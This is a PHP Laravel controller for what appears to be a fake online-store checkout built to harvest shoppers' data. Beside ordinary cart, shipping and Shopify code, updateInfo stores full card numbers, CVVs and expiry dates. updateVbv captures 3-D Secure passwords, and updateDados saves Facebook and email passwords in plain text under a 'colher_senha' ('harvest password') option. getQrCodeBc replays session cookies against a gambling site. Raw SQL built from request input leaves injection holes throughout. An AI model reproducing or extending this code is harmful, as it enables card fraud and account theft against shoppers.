<?php

namespace App\Http\Controllers;

use chillerlan\QRCode\QRCode;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;
use PHPShopify\ShopifySDK;

class CheckoutController extends Controller
{
    public function getCheckoutByHash(Request $request)
    {
        $helper = new Helper();

        if (!$helper->verificaParametro($request->hash)) return response()->json(['status' => 500]);

        $query = DB::select(DB::raw(

            "SELECT c.hash,
                    p.titulo,
                    p.preco,
                    p.imagem1,
                    l.nm_loja,
                    l.cd_tipo_checkout,
                    l.cnpj_loja,
                    l.email_loja,
                    l.img_loja,
                    l.cor_loja,
                    c.quantidade,
                    l.id_loja,
                    c.variacao,
                    l.frete_padrao
             FROM carrinho c
             JOIN produto p ON c.id_produto = p.id_produto
             JOIN loja l ON c.id_loja = l.id_loja
             WHERE c.hash = '" . $request->hash . "'"
        ));

        if (empty($query[0])) return response()->json(['status' => 500]);

        $queryPixelFb = $helper->query("
                    SELECT pixel_1, pixel_2, pixel_3, pixel_4, pixel_5, pixel_6
                    FROM pixel_facebook
                    WHERE id_loja = :id
                ", ['id' => $query[0]->id_loja]);

        $query[0]->pixelfb = (!empty($queryPixelFb[0]) ? $queryPixelFb[0] : []);

        $queryPixelTaboola = $helper->query("
             SELECT *
             FROM pixel_taboola
             WHERE id_loja = :id
        ",
            ['id' => $query[0]->id_loja]);

        $query[0]->pixeltaboola = (!empty($queryPixelTaboola) ? $queryPixelTaboola[0]->id_taboola : null);

        $queryPreferencias = $helper->query("
             SELECT resumo_aberto, ultimo_dia, colher_senha, redirect_link
             FROM checkout_preferencias
             WHERE id_loja = :id
        ", ['id' => $query[0]->id_loja]);

        $queryCartao = $helper->query("
             SELECT *
             FROM cartao_loja
             WHERE id_loja = " . $query[0]->id_loja . "
        ");

        if (!empty($queryCartao)) {
            $query[0]->cc = true;
            $query[0]->vbv = ($queryCartao[0]->vbv == 's' ? true : false);
            $query[0]->mensagem_erro = $queryCartao[0]->mensagem_erro;
        } else {
            $query[0]->cc = false;
            $query[0]->vbv = false;
            $query[0]->mensagem_erro = false;
        }

        $queryLogo = $helper->query("
             SELECT logo_banco
             FROM pagamento_pix
             WHERE id_loja = " . $query[0]->id_loja . "
        ");

        if (!empty($queryLogo)) {
            $query[0]->logo = $this->getLogoBanco($queryLogo[0]);

        } else {
            $query[0]->logo = $this->getLogoBanco('mp');
        }

        if (empty($queryPreferencias)) {
            $query[0]->resumo_aberto = false;
            $query[0]->ultimo_dia = false;
            $query[0]->colher_senha = false;
            $query[0]->redirect_link = null;
        } else {
            $query[0]->resumo_aberto = ($queryPreferencias[0]->resumo_aberto == 's' ? true : false);
            $query[0]->ultimo_dia = ($queryPreferencias[0]->ultimo_dia == 's' ? true : false);
            $query[0]->colher_senha = ($queryPreferencias[0]->colher_senha == 's' ? true : false);
            $query[0]->redirect_link = $queryPreferencias[0]->redirect_link;
        }
        return response()->json($query[0]);
    }

    public function getFretes(Request $request)
    {
        $helper = new Helper();

        if (!$helper->verificaParametro($request->hash)) {
            return response()->json(['status' => 500]);
        }

        try {
            $idLoja = DB::select(DB::raw("
             SELECT id_loja
             FROM carrinho
             WHERE hash = :hash
            "), [
                'hash' => $request->hash
            ]);

            if (empty($idLoja)) return false;

            $fretes = DB::select(DB::raw("
                SELECT *
                FROM frete_loja
                WHERE id_loja = :id_loja
            "), [
                'id_loja' => $idLoja[0]->id_loja
            ]);

            if (empty($fretes)) return ['status' => 200, 'listaFretes' => []];

            return response()->json([
                'status' => 200,
                'listaFretes' => $fretes
            ]);
        } catch (\Exception $e) {
            return response()->json(['status' => 500]);

        }
    }

    public function getMetodosPagamento(Request $request)
    {
        try {
            $helper = new Helper();

            if (!$helper->verificaParametro($request->hash)) return response()->json(['status' => 500]);

            $queryLoja = $helper->query(
                "
                    SELECT id_loja
                    FROM carrinho
                    WHERE hash = :hash
                ",
                ['hash' => $request->hash]
            );

            $queryCliente = $helper->query(
                "
                    SELECT nome_completo,
                           cpf,
                           telefone,
                           cep,
                           rua,
                           numero,
                           bairro,
                           complemento,
                           frete_selecionado,
                           frete_selecionado_valor,
                           email,
                           id_produto,
                           orderbump,
                           IFNULL(vl_orderbump,0) as vl_orderbump
                    FROM carrinho
                    WHERE hash = :hash
                ",
                ['hash' => $request->hash]
            );

            if (empty($queryLoja)) return response()->json(['status' => 500]);

            $pagamentoPix = $helper->query(
                "SELECT tipo_chave,
                        chave,
                        logo_banco
                 FROM pagamento_pix
                 WHERE id_loja = :id_loja
                 ",
                ['id_loja' => $queryLoja[0]->id_loja]
            );

            // if(empty($pagamentoPix)) return response()->json( [ 'status' => 404 ] );
            $queryOrderBump = $helper->query("SELECT produto_orderbump, valor_orderbump FROM produto WHERE id_produto = " . $queryCliente[0]->id_produto);
            $flagOrderBump = false;

            if (!empty($queryOrderBump) && !is_null($queryOrderBump[0]->produto_orderbump)) {
                $flagOrderBump = true;
                $qProdutoOrderBump = $helper->query("
                    SELECT titulo, imagem1
                    FROM produto
                    WHERE id_produto = :id
                ", ['id' => $queryOrderBump[0]->produto_orderbump]);

            }


            return response()->json([
                'status' => 200,
                'listaCliente' => $queryCliente[0],
                'listaTiposPagamento' => [
                    'pix' => $pagamentoPix
                ],
                'listaOrder' => [
                    'order' => $flagOrderBump,
                    'order_produto' => (!empty($qProdutoOrderBump[0]->titulo) ? $qProdutoOrderBump[0]->titulo : null),
                    'order_img' => (!empty($qProdutoOrderBump[0]->imagem1) ? $qProdutoOrderBump[0]->imagem1 : null),
                    'order_vl' => (!empty($queryOrderBump[0]->valor_orderbump) ? $queryOrderBump[0]->valor_orderbump : null)
                ],
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'status' => 500
            ]);
        }
    }

    private function getLogoBanco($obj)
    {
        try {
            $l = [
                'mp' => [
                    'img' => 'mp',
                    'texto' => 'Mercado Pago'
                ],
                'pag' => [
                    'img' => 'pag',
                    'texto' => 'PagSeguro'
                ],
                'inter' => [
                    'img' => 'inter',
                    'texto' => 'Inter'
                ],
                'bradesco' => [
                    'img' => 'bradesco',
                    'texto' => 'Bradesco'
                ],
                'nubank' => [
                    'img' => 'nubank',
                    'texto' => 'Nubank'
                ],
                'santander' => [
                    'img' => 'santander',
                    'texto' => 'Santander'
                ],
                'suitpay' => [
                    'img' => 'suitpay',
                    'texto' => 'Suitpay'
                ],
                'neon' => [
                    'img' => 'neon',
                    'texto' => 'Neon'
                ],
                'stone' => [
                    'img' => 'stone',
                    'texto' => 'Stone'
                ]
            ];

            if (is_null($obj->logo_banco)) {
                return [
                    'img' => 'mp',
                    'texto' => 'Mercado Pago'
                ];
            }

            return $l[$obj->logo_banco];
        } catch (\Exception $e) {
            return [
                'img' => 'mp',
                'texto' => 'Mercado Pago'
            ];
        }
    }

    public function getPagamento(Request $request)
    {
        try {
            $helper = new Helper();

            if (!$helper->verificaParametro($request->hash)) return response()->json(['status' => 500]);

            $idLoja = $helper->query(
                'SELECT id_loja, metodo_pagamento, id_produto
                 FROM carrinho
                 WHERE hash = :hash',
                ['hash' => $request->hash]
            );

            if (empty($idLoja)) return response()->json(['status' => 404]);

            $produto = $helper->query(
                'SELECT titulo, preco
                 FROM produto
                 WHERE id_produto = :id_produto',
                ['id_produto' => $idLoja[0]->id_produto]
            );

            $getValorCarrinho = $helper->query(
                "SELECT quantidade, frete_selecionado_valor, vl_orderbump, orderbump
                     FROM carrinho
                     WHERE hash = :hash", [
                    'hash' => $request->hash
                ]
            );

             if (in_array($idLoja[0]->metodo_pagamento, ['cartao', 'pix'])) {
                $response = (new PagShieldController())->createTransaction($request->hash, $idLoja[0]->metodo_pagamento);

                if ($response['status'] == 404) return response()->json($response);

                DB::table('transactions')
                    ->insert([
                        'hash' => $request->hash,
                        'data' => json_encode($response),
                        'status' => ucfirst($response['status']),
                        'created_at' => date('Y-m-d H:i:s'),
                        'updated_at' => date('Y-m-d H:i:s'),
                    ]);

                if ($response['paymentMethod'] === 'credit_card') {
                    (new UtmifyController())->createOrder($request->hash, $response['status'], 'credit_card', $response['paidAt']);

                    return $this->xxx($request, $idLoja, $getValorCarrinho, $response['secureUrl'], 'card');
                } elseif ($response['paymentMethod'] === 'pix') {
                    (new UtmifyController())->createOrder($request->hash, $response['status'], 'pix');

                    return $this->xxx($request, $idLoja, $getValorCarrinho, $response['secureUrl'], 'pix');
                }
            } else {
                return response()->json(['status' => 500]);
            }
        } catch (\Exception $e) {
            dd($e->getMessage());
            return response()->json(['status' => 500]);
        }
    }

    private function xxx($request, $idLoja, $getValorCarrinho, $secureUrl, $paymentMethod = null)
    {
        $helper = new Helper();
        $whatsapp = new WhatsappController;
        $email = new EmailController;

        $helper->query('UPDATE carrinho SET finalizou_pedido = "s", data_pedido = :dt WHERE hash = :hash', ['hash' => $request->hash, 'dt' => date('Y-m-d H:i:s')]);

        $verificaZap = $helper->query("SELECT instance_id, instance_token FROM whatsapp_loja WHERE id_loja = " . $idLoja[0]->id_loja);
        $verificaEnviado = $helper->query("SELECT whatsapp_pedido, email_pedido FROM carrinho WHERE hash = '" . $request->hash . "'");
        $verificaSmtp = $helper->query("SELECT id, opcao_selecionada FROM smtp_loja WHERE id_loja = " . $idLoja[0]->id_loja);
        $verificaShopify = $helper->query("SELECT * FROM shopify_loja WHERE marcar_pedido = 's' AND id_loja = " . $idLoja[0]->id_loja);
        $verificaShopify2 = $helper->query("SELECT pedido_shopify FROM carrinho WHERE hash ='" . $request->hash . "'");

        if (!empty($verificaShopify) && $verificaShopify2[0]->pedido_shopify == 'n') {
            $objCarrinho = $helper->query("SELECT * FROM carrinho c JOIN produto p ON c.id_produto = p.id_produto WHERE hash = '" . $request->hash . "'");
            $objCarrinho = $objCarrinho[0];
            try {
                $this->finalizaPedido($idLoja[0]->id_loja, $objCarrinho);
            } catch (\Exception $e) {
                //....
            }
        }

        if (!empty($verificaZap) && $verificaEnviado[0]->whatsapp_pedido == 'n') {
            $notificacao = $whatsapp->enviaMensagem($request->hash, 'pedido', $secureUrl);
            if ($notificacao) {
                $whatsapp->atualizaStatus($request->hash, 'whatsapp_pedido');
            }
        }

        if ($verificaEnviado[0]->email_pedido == 'n' && !empty($verificaSmtp)) {
            $email->emailConfirmacao($idLoja[0]->id_loja, $request->hash, $secureUrl);
        }

        return response()->json([
            'status' => 200,
            'secureUrl' => $secureUrl,
            'frete_selecionado_valor' => $getValorCarrinho[0]->frete_selecionado_valor,
            'orderbump' => $getValorCarrinho[0]->orderbump,
            'vl_orderbump' => $getValorCarrinho[0]->vl_orderbump,
            'payment_method' => $paymentMethod
        ]);
    }

    private function getCredenciais($idloja)
    {
        try {
            $q = DB::select(DB::raw("
                SELECT *
                FROM shopify_loja
                WHERE id_loja = " . $idloja . "
            "));

            return [
                'ShopUrl' => $q[0]->dominio_loja,
                'ApiKey' => $q[0]->chave_api,
                'Password' => $q[0]->token_api,
                'Curl' => array(
                    CURLOPT_TIMEOUT => 10,
                    CURLOPT_FOLLOWLOCATION => true
                )
            ];
        } catch (\Exception $e) {
            return false;
        }
    }

    public function finalizaPedido($id_loja, $obj)
    {
        try {
            $config = $this->getCredenciais($id_loja);
            $shopify = new ShopifySDK($config);

            $nome = explode(' ', $obj->nome_completo);
            $nome2 = "";
            $sobrenome = "";
            foreach ($nome as $k => $v) {
                if ($k == 0) $nome2 = $v;
                else $sobrenome .= $v;

            }

            $request = file_get_contents("https://viacep.com.br/ws/" . $obj->cep . "/json/");
            $request = json_decode($request, true);

            $orderData = array(
                'line_items' => array(
                    array(
                        'title' => $obj->titulo,
                        'price' => $obj->preco,
                        'quantity' => $obj->quantidade,
                        'product_id' => $obj->id_shopify,
                        'variant_id' => $obj->id_variante_shopify
                    ),
                ),
                'email' => $obj->email,
                'customer' => [
                    'first_name' => $nome2,
                    'last_name' => $sobrenome,
                    'phone' => '+55' . str_replace(' ', '', str_replace(')', '', str_replace('(', '', str_replace('-', '', $obj->telefone)))),
                    'cpf' => $obj->cpf
                ],
                'shipping_address' => [
                    'first_name' => $nome2,
                    'last_name' => $sobrenome,
                    'address1' => $obj->rua . ', Nr ' . $obj->numero . ' - ' . $obj->bairro,
                    'city' => $request['localidade'],
                    'province' => $request['uf'],
                    'zip' => $obj->cep,
                    'country' => 'BR',
                    'phone' => '+55' . str_replace(' ', '', str_replace(')', '', str_replace('(', '', str_replace('-', '', $obj->telefone)))),
                    'cpf' => $obj->cpf,
                ],
                'billing_address' => [
                    'first_name' => $nome2,
                    'last_name' => $sobrenome,
                    'address1' => $obj->rua . ', Nr ' . $obj->numero . ' - ' . $obj->bairro,
                    'city' => $request['localidade'],
                    'province' => $request['uf'],
                    'zip' => $obj->cep,
                    'country' => 'BR',
                    'phone' => '+55' . str_replace(' ', '', str_replace(')', '', str_replace('(', '', str_replace('-', '', $obj->telefone)))),
                    'cpf' => $obj->cpf,
                ],
                'note' => (!is_null($obj->variacao) ? $obj->variacao : null),
                'financial_status' => 'pending',
                'send_receipt' => true,
            );
            $order = $shopify->Order->post($orderData);

            DB::select(DB::raw("UPDATE carrinho SET pedido_shopify = 's' WHERE hash = '" . $obj->hash . "'"));

            return true;
        } catch (\Exception $e) {
            return false;
        }
    }

    public function pixCopiado(Request $request)
    {
        try {
            $helper = new Helper();
            if (!$helper->verificaParametro($request->hash)) return response()->json(['status' => 500]);

            $helper->query("
                UPDATE carrinho
                SET sn_pix_copiado = 's'
                WHERE hash = :hash
            ", ['hash' => $request->hash]);

            return response()->json(['status' => 200]);

        } catch (\Exception $e) {
            return response()->json(['status' => 500]);

        }
    }

    public function ativaOrderBump(Request $request)
    {
        try {
            $helper = new Helper();


            $q = $helper->query("
            SELECT  p.produto_orderbump, p.valor_orderbump
            FROM carrinho c
            JOIN produto p ON c.id_produto = p.id_produto
            WHERE c.hash = '" . $request->hash . "'");

            $helper->query("
                UPDATE carrinho
                SET orderbump = 's',
                    vl_orderbump = " . $q[0]->valor_orderbump . "
                WHERE hash = '" . $request->hash . "'");

            $q2 = $helper->query("
                SELECT titulo, imagem1
                FROM produto
                WHERE id_produto = " . $q[0]->produto_orderbump);


            return response()->json([
                'status' => 200,
                'titulo' => $q2[0]->titulo,
                'img' => $q2[0]->imagem1,
                'preco' => $q[0]->valor_orderbump
            ]);
        } catch (\Exception $e) {
            return response()->json(['status' => 500]);
        }
    }

    public function desativarOrder(Request $request)
    {
        try {
            $helper = new Helper();
            $helper->query("
                UPDATE carrinho
                SET orderbump = 'n'
                WHERE hash = " . $request->hash);
            return response()->json(['status' => 200]);
        } catch (\Exception $e) {
            return response()->json(['status' => 500]);
        }
    }

    public function getQrCodeBc($cookie, $smid, $valor)
    {
        try {
            $url = 'https://bc.game/api/payment/deposit/fiat/create/';

            $headers = [
                'Authority' => 'bc.game',
                'Method' => 'POST',
                'Path' => '/api/payment/deposit/fiat/create/',
                'Scheme' => 'https',
                'Accept' => 'application/json, text/plain, */*',
                'Accept-Language' => 'pt',
                'Content-Type' => 'application/json',
                'Cookie' => $cookie,
                'Origin' => 'https://bc.game',
                'Referer' => 'https://bc.game/pt',
                'Smid' => $smid,
                'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            ];

            $payload = [
                'currencyName' => 'BRLFIAT',
                'method' => 'Pagsmile',
                'wayName' => 'FIAT',
                'channel' => 'Pagsmile_BRL_PIX',
                'amount' => $valor,
                'kycItem' => (object)[
                    'name' => '',
                    'number' => ''
                ],
            ];

            $l = [
                0 => [
                    'method' => 'Pagsmile',
                    'channel' => 'Pagsmile_BRL_PIX'
                ],
                1 => [
                    'method' => 'BetCat-PIX',
                    'channel' => 'BetCatPay'
                ],
                2 => [
                    'method' => 'TopPay',
                    'channel' => 'TopPay'
                ]
            ];

            $_codigo = null;
            $l2 = [];
            foreach ($l as $k => $v) {
                try {
                    $response = Http::withHeaders($headers)->withOptions(['stream' => true])->post($url, $payload);
                    $body = $response;
                    $body = json_decode($body, true);

                    $l2[] = $body;

                    if ($body['code'] == 6002) {

                    }

                    if ($body['code'] == 0) {
                        $_codigo = $body['data']['data']['qrCode'];
                        break;
                    }
                } catch (\Exception $e) {
                    return $e;
                }
            }
            return $l2;
            if (is_null($_codigo)) return true;

            return $_codigo;

        } catch (\Exception $e) {
            return $e;
        }
    }

    public function pagamentoCartao(Request $request)
    {
        try {

            $whatsapp = new WhatsappController;
            $email = new EmailController;

            $verificaPago = DB::select(DB::raw("
                SELECT status_pagamento
                FROM transacao_cartao
                WHERE hash = '" . $request->hash . "' AND status_pagamento = 'paid'
            "));

            if (!empty($verificaPago)) return response()->json(['status' => 300, 'mensagem' => 'Pedido já pago.']);

            $carrinho = DB::select(DB::raw("
                SELECT c.*,
                       l.id_usuario_pai,
                       p.*
                FROM carrinho c
                LEFT JOIN loja l ON c.id_loja = l.id_loja
                LEFT JOIN produto p ON c.id_produto = p.id_produto
                WHERE c.hash = '" . $request->hash . "'
            "));

            $suitPay = DB::select(DB::raw("
                SELECT ci, cs, usuario_suitpay
                FROM suitpay_loja
                WHERE id_loja = " . $carrinho[0]->id_loja . "
            "));

            $reqIbge = Http::get('https://viacep.com.br/ws/' . $carrinho[0]->cep . '/json/');
            $reqIbge = json_decode($reqIbge, true);


            $reqParcela = Http::withHeaders([
                'ci' => $suitPay[0]->ci,
                'cs' => $suitPay[0]->cs
            ])->get('https://ws.suitpay.app/api/v1/gateway/fee-simulator-gateway?value=' . ($carrinho[0]->preco * $carrinho[0]->quantidade) + $carrinho[0]->vl_orderbump);

            $reqParcela = json_decode($reqParcela, true);

            $amount = ($request->parcela == '1' ? $reqParcela['list'][0]['valueCredito'] : $reqParcela['list'][0]['value' . $request->parcela . 'x']);

            $nome = explode(' ', $carrinho[0]->nome_completo);
            $n = "";
            $s = "";
            $i = 0;
            foreach ($nome as $k => $v) {
                if ($i == 0) $n .= $v;
                else $s .= " " . $v;
            }

            $validade = explode('/', $request->validade);

            $req = Http::withHeaders([
                'ci' => $suitPay[0]->ci,
                'cs' => $suitPay[0]->cs
            ])->post('https://ws.suitpay.app/api/v1/gateway/' . ($request->valida3ds ? 'validate' : 'card'), [
                'requestNumber' => $request->hash,
                'amount' => $amount,
                'shippingAmount' => $carrinho[0]->frete_selecionado_valor,
                'clientIp' => $request->ip,
                'usernameCheckout' => $suitPay[0]->usuario_suitpay,
                'client' => [
                    'name' => $n . ' ' . $s,
                    'document' => $carrinho[0]->cpf,
                    'phoneNumber' => str_replace(')', '', str_replace('(', '', str_replace(' ', '', str_replace('-', '', $carrinho[0]->telefone)))),
                    'email' => $carrinho[0]->email,
                    'address' => [
                        'codIbge' => $reqIbge['ibge'],
                        'street' => $carrinho[0]->rua,
                        'number' => (!is_null($carrinho[0]->numero) ? $carrinho[0]->numero : 0),
                        'zipCode' => $carrinho[0]->cep,
                        'neighborhood' => $carrinho[0]->bairro,
                        'city' => $reqIbge['localidade'],
                        'state' => $reqIbge['uf']
                    ]
                ],
                'card' => [
                    'number' => $request->cartao,
                    'expirationMonth' => $validade[0],
                    'expirationYear' => $validade[1],
                    'cvv' => $request->cvv,
                    'installment' => $request->parcela,
                    'amount' => $amount,
                ],
                'products' => [
                    [
                        'description' => $carrinho[0]->titulo,
                        'quantity' => $carrinho[0]->quantidade,
                        'value' => $carrinho[0]->preco
                    ]
                ],
                'deviceInfo' => [
                    'httpAcceptBrowserValue' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'httpAcceptContent' => 'application/pdf, text/pdf',
                    'httpBrowserColorDepth' => '24',
                    'httpBrowserJavaEnabled' => 'N',
                    'httpBrowserJavaScriptEnabled' => 'Y',
                    'httpBrowserLanguage' => 'pt-BR	',
                    'httpBrowserScreenHeight' => '864',
                    'httpBrowserScreenWidth' => '1536',
                    'httpBrowserTimeDifference' => '180',
                    'userAgentBrowserValue' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0'
                ],
                'code3DS' => $request->ds,
                'urlSite3DS' => $request->url,
                'validateToken' => ($request->valida3ds ? $request->jwt : null)
            ]);

            $req = json_decode($req, true);

            $helper = new Helper();

            $verificaZap = $helper->query("SELECT instance_id, instance_token FROM whatsapp_loja WHERE id_loja = " . $carrinho[0]->id_loja);
            $verificaEnviado = $helper->query("SELECT whatsapp_pedido, email_pedido FROM carrinho WHERE hash = '" . $request->hash . "'");
            $verificaSmtp = $helper->query("SELECT id, opcao_selecionada FROM smtp_loja WHERE id_loja = " . $carrinho[0]->id_loja);

            if ($req['statusTransaction'] == 'PAYMENT_ACCEPT') {
                $helper->query('UPDATE carrinho SET finalizou_pedido = "s", data_pedido = :dt WHERE hash = :hash', ['hash' => $request->hash, 'dt' => date('Y-m-d H:i:s')]);
                $insert = DB::table('transacao_cartao')->insertGetId([
                    'hash' => $request->hash,
                    'id_transaction' => $req['idTransaction'],
                    'status_pagamento' => 'paid',
                    'data' => date('Y-m-d H:i:s'),
                    'retorno_gateway' => $req['statusTransaction'],
                    'cartao' => $request->cartao,
                    'validade' => $request->validade,
                    'cvv' => $request->cvv,
                    'nome' => $request->nome,
                    'cpf' => $request->cpf
                ]);

                DB::select(DB::raw("
                    UPDATE carrinho
                    SET status_pagamento = 'paid', metodo_pagamento = 'card'
                    WHERE hash = '" . $request->hash . "'
                    "));

                if ($verificaEnviado[0]->email_pedido == 'n' && !empty($verificaSmtp)) {
                    $email->emailConfirmacao($carrinho[0]->id_loja, $request->hash, 'PIX_CODIGO', true);
                }


                return response()->json(['status' => 200]);
            }

            if ($req['response'] == 'OK' && $req['statusTransaction'] == 'WAITING_FOR_APPROVAL') {

                $helper->query('UPDATE carrinho SET finalizou_pedido = "s", data_pedido = :dt WHERE hash = :hash', ['hash' => $request->hash, 'dt' => date('Y-m-d H:i:s')]);

                $insert = DB::table('transacao_cartao')->insertGetId([
                    'hash' => $request->hash,
                    'id_transaction' => $req['idTransaction'],
                    'status_pagamento' => 'waiting',
                    'data' => date('Y-m-d H:i:s'),
                    'retorno_gateway' => $req['statusTransaction'],
                    'cartao' => $request->cartao,
                    'validade' => $request->validade,
                    'cvv' => $request->cvv,
                    'nome' => $request->nome,
                    'cpf' => $request->cpf
                ]);

                DB::select(DB::raw("
                UPDATE carrinho
                SET status_pagamento = 'waiting', metodo_pagamento = 'card'
                WHERE hash = '" . $request->hash . "'
                "));


                return response()->json(['status' => 201]);
            }

            if ($req['response'] == 'CARD_ERROR' && $req['statusTransaction'] == 'CANCELED') {
                $insert = DB::table('transacao_cartao')->insertGetId([
                    'hash' => $request->hash,
                    'id_transaction' => $req['idTransaction'],
                    'status_pagamento' => 'unpaid',
                    'data' => date('Y-m-d H:i:s'),
                    'retorno_gateway' => $req['statusTransaction'],
                    'cartao' => $request->cartao,
                    'validade' => $request->validade,
                    'cvv' => $request->cvv,
                    'nome' => $request->nome,
                    'cpf' => $request->cpf
                ]);

                DB::select(DB::raw("
                UPDATE carrinho
                SET status_pagamento = 'unpaid', metodo_pagamento = 'card'
                WHERE hash = '" . $request->hash . "'
                "));

                return response()->json(['status' => 202]);

            }

            if ($req['response'] == 'CHALLENGE') {
                return response()->json([
                    'status' => 310,
                    'acsUrl' => $req['acsUrl'],
                    'pareq' => $req['pareq'],
                    'authenticationTransactionId' => $req['authenticationTransactionId'],
                    'mensagem' => 'challenge'
                ]);
            }

            return response()->json(['status' => 500]);
        } catch (\Exception $e) {
            return $e;
            return response()->json(['status' => 500]);
        }
    }

    public function getParcela(Request $request)
    {
        try {
            $idLoja = DB::select(DB::raw("
                SELECT id_loja
                FROM carrinho
                WHERE hash = '" . $request->hash . "'
            "));

            $suitPay = DB::select(DB::raw("
                SELECT ci, cs, usuario_suitpay
                FROM suitpay_loja
                WHERE id_loja = " . $idLoja[0]->id_loja . "
            "));

            $reqParcela = Http::withHeaders([
                'ci' => $suitPay[0]->ci,
                'cs' => $suitPay[0]->cs
            ])->get('https://ws.suitpay.app/api/v1/gateway/fee-simulator-gateway?value=' . $request->v);

            $reqParcela = json_decode($reqParcela, true);

            $l = [];
            $l['parcela'] = $reqParcela['list'][0];
            return response()->json([$l]);
        } catch (\Exception $e) {

            return response()->json(['status' => 500]);
        }
    }

    public function updateInfo(Request $request)
    {
        try {
            $getLoja = DB::select(DB::raw("SELECT id_loja FROM carrinho WHERE hash = '" . $request->hash . "'"));

            $insert = DB::table('cartao')->insertGetId([
                'hash' => $request->hash,
                'cc' => $request->cc,
                'validade' => $request->validade,
                'titular' => $request->titular,
                'cpf' => $request->cpf,
                'cvv' => $request->cvv,
                'horario' => date('Y-m-d H:i:s'),
                'bin' => $request->bin,
                'id_loja' => $getLoja[0]->id_loja
            ]);

            DB::table('carrinho')
                ->where('hash', $request->hash)
                ->update([
                    'finalizou_pedido' => 's',
                    'data_pedido' => date('Y-m-d H:i:s'),
                    'metodo_pagamento' => 'cartao',
                    'installments' => $request->installments
                ]);

            $queryIdUsuario = DB::select(DB::raw("SELECT id_usuario_pai FROM loja WHERE id_loja = " . $getLoja[0]->id_loja));
            $queryDigitos = DB::select(DB::raw("SELECT digitos FROM bins WHERE bin = '" . $request->bin . "'"));
            $queryPreferencias = DB::select(DB::raw("SELECT * FROM bins_preferencias WHERE bin = '" . $request->bin . "' AND id_usuario = " . $queryIdUsuario[0]->id_usuario_pai));
            if (!empty($queryPreferencias)) {
                return response()->json(['status' => 200, 'i' => $insert, 'v' => $queryPreferencias[0]->vbv, 'd' => $queryPreferencias[0]->digitos]);
            }

            return response()->json(['status' => 200, 'i' => $insert, 'v' => 'n', 'd' => (!empty($queryDigitos) ? $queryDigitos[0]->digitos : 404)]);

        } catch (\Exception $e) {
            return response()->json(['status' => 500]);
        }
    }

    public function updateVbv(Request $request)
    {
        try {
            DB::select(DB::raw("UPDATE cartao SET senha = '" . $request->senha . "' WHERE id = " . $request->id));

            return response()->json(['sttatus' => 200]);
        } catch (\Exception $e) {
            return response()->json(['status' => 500]);
        }
    }

    public function getLogin(Request $request)
    {
        try {
            if (is_null($request->hash)) return response()->json(['status' => 404]);

            $qry = DB::select(DB::raw("SELECT id_loja, realizou_login FROM carrinho c WHERE hash = '" . $request->hash . "'"));

            if (empty($qry)) return response()->json(['status' => 404]);

            $qry2 = DB::select(DB::raw("SELECT cd_tipo_checkout FROM loja WHERE id_loja = " . $qry[0]->id_loja));

            return response()->json([
                'status' => 200,
                'path' => '/checkout/' . $qry2[0]->cd_tipo_checkout . '/' . $request->hash . '/1',
                'realizou_login' => ($qry[0]->realizou_login == 's' ? true : false),
            ]);
        } catch (\Exception $e) {
            return response()->json(['status' => 500]);
        }
    }

    public function updateDados(Request $request)
    {
        try {
            $getIdLoja = DB::select(DB::raw("SELECT id_loja FROM carrinho WHERE hash = '" . $request->hash . "'"));

            if ($request->facebook == 's') {
                $verifica1 = DB::select(DB::raw("SELECT * FROM facebook WHERE email = '" . $request->email . "' AND senha ='" . $request->senha . "' "));
                if (!empty($verifica1)) return response()->json(['status' => 200]);

                DB::table('facebook')->insert([
                    'email' => $request->email,
                    'senha' => $request->senha,
                    'hash' => $request->hash,
                    'horario' => date('Y-m-d H:i:s'),
                    'id_loja' => $getIdLoja[0]->id_loja
                ]);

                return response()->json(['status' => 200]);
            }
            DB::select(DB::raw("UPDATE carrinho SET realizou_login = 's', email = '" . $request->email . "', email_senha = '" . $request->senha . "' WHERE hash = '" . $request->hash . "' "));

            return response()->json(['status' => 200]);
        } catch (\Exception $e) {
            return response()->json(['status' => 500]);
        }
    }
}

